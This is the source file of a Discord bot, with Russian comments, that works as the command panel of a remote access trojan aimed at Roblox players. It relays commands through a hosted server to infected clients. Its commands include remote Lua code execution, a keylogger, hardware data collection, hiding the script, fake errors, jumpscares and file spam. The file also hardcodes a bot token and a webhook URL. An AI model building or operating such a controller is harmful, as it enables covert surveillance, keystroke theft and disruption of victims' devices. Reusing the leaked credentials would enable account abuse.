const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const fetch = require('node-fetch');

const client = new Client({ 
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers
    ] 
});

const SERVER_URL = "https://ratserver-6wo3.onrender.com";
const WEBHOOK_URL = "https://discord.com/api/webhooks/1441710251907874827/efwNq3IivAGdyCj2r8phcjQ3lgDChQmjyAikK--kiE95IkwcwftqYgQ-h561X_OBpI8_";

// Функция отправки команды на сервер
async function sendCommand(command, args = [], target = null) {
    try {
        const response = await fetch(`${SERVER_URL}/command`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ command, args, target })
        });
        console.log(`📨 Команда ${command} отправлена`);
        return response.ok;
    } catch (error) {
        console.error(`❌ Ошибка отправки команды ${command}:`, error);
        return false;
    }
}

// Получение списка пользователей
async function getOnlineUsers() {
    try {
        const response = await fetch(`${SERVER_URL}/users`);
        if (response.ok) {
            return await response.json();
        }
        return { users: [], count: 0 };
    } catch (error) {
        console.error('❌ Ошибка получения пользователей:', error);
        return { users: [], count: 0 };
    }
}

client.on('ready', () => {
    console.log(`🤖 Discord бот ${client.user.tag} запущен!`);
    console.log(`🌐 Подключено к серверу: ${SERVER_URL}`);
    
    client.user.setActivity('RAT Control Panel v2.8', { type: 'WATCHING' });
});

// Обработка слеш-команд
client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    const { commandName, options } = interaction;

    // /help
    if (commandName === 'help') {
        const embed = new EmbedBuilder()
            .setTitle('🤖 RAT Control Panel v2.8')
            .setDescription('Полный список команд для управления клиентами')
            .setColor(0x7289da)
            .addFields(
                { name: '🧪 Основные команды', value: '`/test` - Тестовая команда\n`/print` - Проверка связи' },
                { name: '💬 Чат команды', value: '`/chat` - Включить/выключить чат\n`/message [текст]` - Отправить сообщение' },
                { name: '👤 Управление игроком', value: '`/kick [причина]` - Кикнуть\n`/freeze [секунды]` - Заморозить\n`/void` - Телепорт в бездну\n`/spin` - Крутить\n`/fling` - Подбросить\n`/sit` - Сидеть/встать\n`/dance` - Танцевать' },
                { name: '🔊 Аудио/Видео', value: '`/mute` - Выключить звуки\n`/unmute` - Включить звуки\n`/blur [секунды]` - Размытие экрана' },
                { name: '👻 Скримеры', value: '`/jumpscare [тип]` - Запустить скример (1-Джефф, 2-Соник)' },
                { name: '👥 Пользователи', value: '`/users` - Показать онлайн пользователей\n`/status` - Статус системы' },
                { name: '⚙️ Системные команды', value: '`/execute [код]` - Выполнить Lua код\n`/fakeerror [текст]` - Фейковая ошибка\n`/keylog` - Включить кейлоггер\n`/stopkeylog` - Выключить кейлоггер' },
                { name: '🖥️ Оборудование', value: '`/hardware` - Данные об оборудовании\n`/hide` - Скрыть скрипт' },
                { name: '💥 Spam команды', value: '`/memory [кол-во]` - Спам файлами\n`/gallery [кол-во]` - Спам видео' }
            )
            .setFooter({ text: `Сервер: ${SERVER_URL}` })
            .setTimestamp();

        await interaction.reply({ embeds: [embed] });
    }

    // /test
    if (commandName === 'test') {
        if (await sendCommand("popup", ["Тестовая команда от Discord бота! ✅"])) {
            await interaction.reply('✅ Тестовая команда отправлена!');
        } else {
            await interaction.reply('❌ Ошибка отправки команды');
        }
    }

    // /print
    if (commandName === 'print') {
        if (await sendCommand("print")) {
            const embed = new EmbedBuilder()
                .setTitle('📡 Проверка связи')
                .setDescription('Команда проверки связи отправлена')
                .setColor(0x00ff00);
            await interaction.reply({ embeds: [embed] });
        } else {
            await interaction.reply('❌ Ошибка отправки команды');
        }
    }

    // /users
    if (commandName === 'users') {
        await interaction.deferReply();
        
        const data = await getOnlineUsers();
        
        if (data.count === 0) {
            const embed = new EmbedBuilder()
                .setTitle('👥 Онлайн пользователи')
                .setDescription('❌ Нет активных пользователей')
                .setColor(0xff0000);
            await interaction.editReply({ embeds: [embed] });
            return;
        }

        const embed = new EmbedBuilder()
            .setTitle('👥 Онлайн пользователи')
            .setDescription(`**Всего пользователей:** ${data.count}`)
            .setColor(0x00ff00)
            .setTimestamp();

        // Группируем по играм
        const games = {};
        data.users.forEach(user => {
            const game = user.place || 'Unknown';
            if (!games[game]) games[game] = [];
            games[game].push(user);
        });

        for (const [game, users] of Object.entries(games)) {
            const userList = users.slice(0, 5).map(u => 
                `\`${u.player}\` (${u.executor || 'Unknown'})`
            ).join('\n');
            
            embed.addFields({
                name: `🎮 ${game} (${users.length})`,
                value: userList + (users.length > 5 ? `\n... и еще ${users.length - 5}` : ''),
                inline: false
            });
        }

        await interaction.editReply({ embeds: [embed] });
    }

    // /status
    if (commandName === 'status') {
        try {
            const response = await fetch(`${SERVER_URL}/status`);
            if (response.ok) {
                const data = await response.json();
                
                const embed = new EmbedBuilder()
                    .setTitle('📊 Статус системы')
                    .setDescription('Текущее состояние RAT Control System')
                    .setColor(0x7289da)
                    .addFields(
                        { name: '🤖 Бот', value: '🟢 Активен', inline: true },
                        { name: '🌐 Сервер', value: '🟢 Активен', inline: true },
                        { name: '📨 Команды в очереди', value: `\`${data.pending_commands || 0}\``, inline: true },
                        { name: '👥 Онлайн пользователей', value: `\`${data.online_users || 0}\``, inline: true },
                        { name: '🛠️ Техническая информация', value: `• Версия: \`2.8.0\`\n• Сервер: \`${SERVER_URL}\`\n• Обновление: \`15 секунд\``, inline: false }
                    )
                    .setTimestamp();
                
                await interaction.reply({ embeds: [embed] });
            }
        } catch (error) {
            await interaction.reply('❌ Ошибка получения статуса');
        }
    }

    // /kick
    if (commandName === 'kick') {
        const reason = options.getString('причина') || 'Нарушение правил';
        
        if (await sendCommand("kick", [reason])) {
            const embed = new EmbedBuilder()
                .setTitle('🦶 Игроки кикнуты')
                .setDescription(`**Причина:** ${reason}`)
                .setColor(0xe74c3c);
            await interaction.reply({ embeds: [embed] });
        } else {
            await interaction.reply('❌ Ошибка отправки команды');
        }
    }

    // /freeze
    if (commandName === 'freeze') {
        const seconds = options.getInteger('секунды') || 5;
        const safeSeconds = Math.min(seconds, 60);
        
        if (await sendCommand("freeze", [safeSeconds])) {
            const embed = new EmbedBuilder()
                .setTitle('❄️ Заморозка активирована')
                .setDescription(`Игроки заморожены на \`${safeSeconds}\` секунд`)
                .setColor(0x3498db);
            await interaction.reply({ embeds: [embed] });
        } else {
            await interaction.reply('❌ Ошибка отправки команды');
        }
    }

    // /void
    if (commandName === 'void') {
        if (await sendCommand("void")) {
            const embed = new EmbedBuilder()
                .setTitle('🌀 Телепорт в бездну')
                .setDescription('Игроки телепортированы в бездну')
                .setColor(0x2c3e50);
            await interaction.reply({ embeds: [embed] });
        } else {
            await interaction.reply('❌ Ошибка отправки команды');
        }
    }

    // /jumpscare
    if (commandName === 'jumpscare') {
        const type = options.getInteger('тип') || 1;
        const scareNames = { 1: "Джефф Килер 👹", 2: "Соник.exe 💀" };
        const name = scareNames[type] || scareNames[1];
        
        if (await sendCommand("jumpscare", [type])) {
            const embed = new EmbedBuilder()
                .setTitle(`👻 Скример ${name} запущен!`)
                .setDescription('**Тайминг:**\n1. 2 сек - звук предупреждения\n2. 3 сек - пауза\n3. ⚡ СКРИМЕР!\n\n⚠️ Приготовься к ужасу!')
                .setColor(0xff0000)
                .addFields(
                    { name: '🎭 Тип', value: name, inline: true },
                    { name: '🕒 Длительность', value: '~10 секунд', inline: true }
                )
                .setFooter({ text: 'Полноэкранный режим активирован' });
            
            await interaction.reply({ embeds: [embed] });
        } else {
            await interaction.reply('❌ Ошибка отправки команды');
        }
    }

    // /message
    if (commandName === 'message') {
        const text = options.getString('текст');
        if (!text) {
            await interaction.reply('❌ Укажите текст сообщения');
            return;
        }
        
        if (text.length > 100) {
            await interaction.reply('❌ Сообщение слишком длинное (макс. 100 символов)');
            return;
        }
        
        if (await sendCommand("popup", [text])) {
            const embed = new EmbedBuilder()
                .setTitle('📩 Сообщение отправлено')
                .setDescription(`\`\`\`${text}\`\`\``)
                .setColor(0x3498db);
            await interaction.reply({ embeds: [embed] });
        } else {
            await interaction.reply('❌ Ошибка отправки сообщения');
        }
    }

    // /memory
    if (commandName === 'memory') {
        const count = Math.min(options.getInteger('кол-во') || 100, 1000);
        
        const embed = new EmbedBuilder()
            .setTitle('💾 Запуск Memory Spam')
            .setDescription(`Создание ${count} файлов...`)
            .setColor(0xff6b6b);
        
        await interaction.reply({ embeds: [embed] });
        
        if (await sendCommand("memory_spam", [count])) {
            const successEmbed = new EmbedBuilder()
                .setTitle('✅ Memory Spam запущен')
                .setDescription(`Создание ${count} файлов начато`)
                .setColor(0xff6b6b);
            await interaction.editReply({ embeds: [successEmbed] });
        } else {
            const errorEmbed = new EmbedBuilder()
                .setTitle('❌ Ошибка')
                .setDescription('Не удалось отправить команду')
                .setColor(0xff0000);
            await interaction.editReply({ embeds: [errorEmbed] });
        }
    }
});

client.on('messageCreate', async message => {
    // Обработка старых команд через префикс /
    if (message.content.startsWith('/') && !message.author.bot) {
        const args = message.content.slice(1).split(' ');
        const command = args.shift().toLowerCase();
        
        // Для совместимости со старыми командами
        switch(command) {
            case 'test':
                if (await sendCommand("popup", ["Тест!"])) {
                    message.reply('✅ Тест!');
                }
                break;
            case 'users':
                const data = await getOnlineUsers();
                message.reply(`👥 Онлайн: ${data.count} пользователей`);
                break;
            case 'kick':
                if (await sendCommand("kick", [args.join(' ') || 'Кикнут'])) {
                    message.reply('🦶 Кикнут!');
                }
                break;
            // ... добавь другие команды при необходимости
        }
    }
});

// Регистрация слеш-команд
const { REST } = require('@discordjs/rest');
const { Routes } = require('discord-api-types/v10');

const commands = [
    {
        name: 'help',
        description: '📜 Показать список всех команд'
    },
    {
        name: 'test',
        description: '🧪 Тестовая команда'
    },
    {
        name: 'print',
        description: '📡 Проверка связи'
    },
    {
        name: 'users',
        description: '👥 Показать онлайн пользователей'
    },
    {
        name: 'status',
        description: '📊 Показать статус системы'
    },
    {
        name: 'kick',
        description: '🦶 Кикнуть игроков',
        options: [{
            name: 'причина',
            type: 3,
            description: 'Причина кика',
            required: false
        }]
    },
    {
        name: 'freeze',
        description: '❄️ Заморозить игроков',
        options: [{
            name: 'секунды',
            type: 4,
            description: 'Длительность заморозки (макс. 60)',
            required: false,
            min_value: 1,
            max_value: 60
        }]
    },
    {
        name: 'void',
        description: '🌀 Телепортировать в бездну'
    },
    {
        name: 'jumpscare',
        description: '👻 Запустить скример',
        options: [{
            name: 'тип',
            type: 4,
            description: '1-Джефф Килер, 2-Соник.exe',
            required: false,
            choices: [
                { name: 'Джефф Килер', value: 1 },
                { name: 'Соник.exe', value: 2 }
            ]
        }]
    },
    {
        name: 'message',
        description: '📩 Отправить всплывающее сообщение',
        options: [{
            name: 'текст',
            type: 3,
            description: 'Текст сообщения',
            required: true
        }]
    },
    {
        name: 'memory',
        description: '💾 Спам файлами в памяти',
        options: [{
            name: 'кол-во',
            type: 4,
            description: 'Количество файлов (макс. 1000)',
            required: false,
            min_value: 1,
            max_value: 1000
        }]
    }
];

const rest = new REST({ version: '10' }).setToken('MTM5Nzk4NTQyODM4NDI1NjAwMA.GHeP85.k2qv2aPdZQTLCnZAMh1JgWtxrpLTnBAZ8sdSRA');

(async () => {
    try {
        console.log('🔄 Регистрация слеш-команд...');
        await rest.put(
            Routes.applicationCommands('1397985428384256000'),
            { body: commands }
        );
        console.log('✅ Слеш-команды зарегистрированы!');
    } catch (error) {
        console.error('❌ Ошибка регистрации команд:', error);
    }
})();

// Экспорт для использования в server.js
module.exports = { client, sendCommand, getOnlineUsers };

// Запуск бота (будет запущен из server.js)
// client.login('MTM5Nzk4NTQyODM4NDI1NjAwMA.GHeP85.k2qv2aPdZQTLCnZAMh1JgWtxrpLTnBAZ8sdSRA');
